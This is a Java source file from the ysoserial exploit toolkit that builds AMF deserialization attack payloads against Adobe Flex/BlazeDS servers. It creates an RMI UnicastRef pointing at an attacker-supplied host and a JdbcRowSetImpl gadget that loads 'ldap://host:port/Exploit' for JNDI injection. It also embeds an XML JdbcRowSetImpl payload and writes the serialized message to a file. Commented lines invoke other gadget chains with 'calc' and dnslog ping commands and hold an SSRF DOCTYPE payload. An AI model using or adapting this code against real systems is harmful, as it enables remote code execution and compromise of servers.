package ysoserial.payloads;

import java.io.*;
import java.util.Arrays;

import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.ActionContext;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.amf.AmfMessageDeserializer;
import flex.messaging.io.amf.AmfMessageSerializer;
import flex.messaging.io.amf.MessageBody;
import ysoserial.payloads.util.Gadgets;

// 参考：
// https://www.cnblogs.com/afanti/p/11396074.html
// https://seclists.org/fulldisclosure/2018/Apr/40
// generateUnicastRef函数相当与yso中的JRMPClient模块

public class Amf3ExternalizableUnicastRef {

    public static void main(String[] args) throws Exception {
        if (args.length < 3) {
            System.err.println("usage: java -jar " + Amf3ExternalizableUnicastRef.class.getSimpleName() + ".jar <host> <port> <outFile>");
            return;
        }

        // 是否反序列化的开关
        boolean doDeserialize = true;

        // generate the UnicastRef object
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));

//        Object yso = new CommonsBeanutils1_Cl2_3().getObject("ping hihihi.v39es1.dnslog.cn");
//        Object yso = new CommonsCollections7().getObject("calc");
//        Object yso = new Jdk8u20().getObject("ping 111.syaydi.dnslog.cn");
//        Object yso = new Jdk7u21().getObject("ping 222.syaydi.dnslog.cn");
//        String ssrfPayload = "<!DOCTYPE foo PUBLIC \"-//VSR//PENTEST//EN\"\n" +
//            "\"http://ip:8888/protected-service\"><foo>Some content</foo>";

        // serialize object to AMF message
//        byte[] amf = serialize(unicastRef);
//        byte[] amf = serialize(ssrfPayload);
//        byte[] amf = serialize(createPoC("ip", 8888));

        String payload = "<ActionMessage>\n" +
            "  <version>3</version>\n" +
            "  <headers/>\n" +
            "  <bodies>\n" +
            "    <MessageBody>\n" +
            "      <targetURI></targetURI>\n" +
            "      <responseURI></responseURI>\n" +
            "      <data class=\"com.sun.rowset.JdbcRowSetImpl\" serialization=\"custom\">\n" +
            "        <javax.sql.rowset.BaseRowSet>\n" +
            "          <default>\n" +
            "            <concurrency>1008</concurrency>\n" +
            "            <escapeProcessing>true</escapeProcessing>\n" +
            "            <fetchDir>1000</fetchDir>\n" +
            "            <fetchSize>0</fetchSize>\n" +
            "            <isolation>2</isolation>\n" +
            "            <maxFieldSize>0</maxFieldSize>\n" +
            "            <maxRows>0</maxRows>\n" +
            "            <queryTimeout>0</queryTimeout>\n" +
            "            <readOnly>true</readOnly>\n" +
            "            <rowSetType>1004</rowSetType>\n" +
            "            <showDeleted>false</showDeleted>\n" +
            "            <listeners/>\n" +
            "            <params/>\n" +
            "          </default>\n" +
            "        </javax.sql.rowset.BaseRowSet>\n" +
            "        <com.sun.rowset.JdbcRowSetImpl>\n" +
            "          <default>\n" +
            "            <iMatchColumns>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "              <int>-1</int>\n" +
            "            </iMatchColumns>\n" +
            "            <strMatchColumns>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "              <null/>\n" +
            "            </strMatchColumns>\n" +
            "          </default>\n" +
            "        </com.sun.rowset.JdbcRowSetImpl>\n" +
            "      </data>\n" +
            "    </MessageBody>\n" +
            "  </bodies>\n" +
            "</ActionMessage>";


        byte[] amf = serialize(payload.getBytes());



        // deserialize AMF message
        if (doDeserialize) {
            System.out.write(amf);
            deserialize(amf);
        } else {
            System.out.write(amf);

//            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
//            os.write(amf);

            (new FileOutputStream(args[2])).write(amf);
        }
    }

    public static Object createPoC(String host, int port) {
        com.sun.rowset.JdbcRowSetImpl jdbcRowSet = new com.sun.rowset.JdbcRowSetImpl();
        try {
            jdbcRowSet.setDataSourceName("ldap://" + host + ":" + port + "/Exploit");
//            jdbcRowSet.setAutoCommit(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return (Object)jdbcRowSet;
    }


    public static Object createCMD(String command) {
        Object obj = null;
        try {
            obj = Gadgets.createTemplatesImpl(com.sun.rowset.JdbcRowSetImpl.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return obj;
    }


    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);

        ActionMessage message = new ActionMessage();
        message.addBody(body);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);

        return out.toByteArray();
    }

    public static void deserialize(byte[] amf) throws ClassNotFoundException, IOException {
        ByteArrayInputStream in = new ByteArrayInputStream(amf);

        AmfMessageDeserializer deserializer = new AmfMessageDeserializer();
        deserializer.initialize(SerializationContext.getSerializationContext(), in, null);
        deserializer.readMessage(new ActionMessage(), new ActionContext());
    }
}
